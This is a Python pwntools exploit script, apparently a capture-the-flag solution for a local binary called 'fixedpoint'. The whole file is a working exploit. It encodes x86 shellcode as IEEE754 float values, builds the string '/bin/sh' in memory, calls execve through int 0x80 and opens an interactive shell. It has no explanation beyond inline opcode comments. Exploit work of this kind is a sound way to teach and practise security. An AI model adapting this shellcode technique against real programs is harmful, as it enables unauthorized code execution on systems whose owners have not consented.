#!/usr/bin/python
from pwn import *
from struct import *

def get_int(s):
  a = struct.unpack('<f', s)[0]* 1337
  return int(a)

p = process('fixedpoint')

print "Sending IEEE754 shellcode..."
time.sleep(1)

for i in range(3):
  p.sendline(str(get_int('\x00\x00\x00\x00')))

p.sendline(str(get_int('\x99\x89\xc3\x47')))     # mov ebx, eax
p.sendline(str(get_int('\x41\x44\x44\x44')))     # nop/align

for c in '/bin/sh\x00':
  p.sendline(str(get_int('\x99\xb0'+c+'\x47')))  # mov al, c
  p.sendline(str(get_int('\x57\x89\x03\x43')))   # mov [ebx], eax; inc ebx

for i in range(8):
  p.sendline(str(get_int('\x57\x4b\x41\x47')))   # dec ebx

p.sendline(str(get_int('\x99\x31\xc0\x47')))     # xor eax, eax
p.sendline(str(get_int('\x99\x31\xc9\x47')))     # xor ecx, ecx
p.sendline(str(get_int('\x99\x31\xd2\x47')))     # xor edx, edx
p.sendline(str(get_int('\x99\xb0\x0b\x47')))     # mov al, 0xb
p.sendline(str(get_int('\x99\xcd\x80\x47')))     # int 0x80

p.sendline('c')
p.interactive()